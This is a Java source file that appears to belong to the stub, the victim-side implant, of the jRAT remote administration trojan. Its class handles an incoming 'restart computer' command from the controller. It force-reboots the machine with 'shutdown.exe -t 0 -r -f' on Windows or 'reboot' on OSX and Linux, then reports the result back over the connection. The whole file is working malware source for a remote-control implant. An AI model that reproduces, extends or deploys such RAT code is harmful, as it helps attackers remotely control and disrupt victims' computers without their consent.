package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Constants;

import com.redpois0n.oslib.OperatingSystem;

public class Packet29RestartComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -t 0 -r -f");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
			Runtime.getRuntime().exec("reboot");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else {

			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
